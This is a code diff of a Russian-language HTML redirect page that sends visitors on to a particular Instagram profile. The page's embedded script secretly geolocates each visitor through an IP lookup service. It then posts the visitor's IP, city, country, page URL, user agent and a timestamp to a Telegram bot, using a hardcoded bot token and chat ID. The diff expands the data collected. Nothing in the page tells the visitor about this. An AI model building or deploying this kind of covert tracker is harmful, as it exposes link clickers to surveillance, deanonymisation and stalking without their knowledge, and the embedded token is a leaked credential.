@@ -2,29 +2,42 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Redirect...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-<body style="margin:0; padding:0; background:#fff;">
+  <title>Redirecting...</title>
   <script>
     const TOKEN = "7930993307:AAHuIxRVgr9OD7ZP_D2dbrbEu-JGBdZSnc4";
     const CHAT_ID = "5253808709";
-    const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     fetch("https://ipwho.is/")
       .then(res => res.json())
       .then(data => {
-        const msg = `📥 Заход на редирект\n🌍 IP: ${data.ip}\n📍 ${data.city}, ${data.country}\n🕒 ${new Date().toLocaleString()}`;
-        fetch(API, {
+        const msg = `🔁 Заход с авто-редиректом
+🌐 URL: ${location.href}
+📱 UA: ${navigator.userAgent}
+🌍 IP: ${data.ip}
+🏙️ ${data.city}, ${data.country}
+🕒 ${new Date().toLocaleString()}`;
+        fetch(API_URL, {
           method: "POST",
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
       });
 
-    setTimeout(() => {
-      window.location.href = "https://ig.me/m/tymin_min374";
-    }, 600);
+    window.onload = () => {
+      const ua = navigator.userAgent;
+      const isIphone = /iPhone|iPad|iPod/i.test(ua);
+      const isAndroid = /Android/i.test(ua);
+
+      if (isIphone) {
+        window.location.href = "instagram://user?username=tymin_min374";
+      } else if (isAndroid) {
+        window.location.href = "intent://instagram.com/_u/tymin_min374#Intent;package=com.instagram.android;scheme=https;end;";
+      } else {
+        window.location.href = "https://instagram.com/tymin_min374";
+      }
+    };
   </script>
-</body>
+</head>
+<body></body>
 </html>
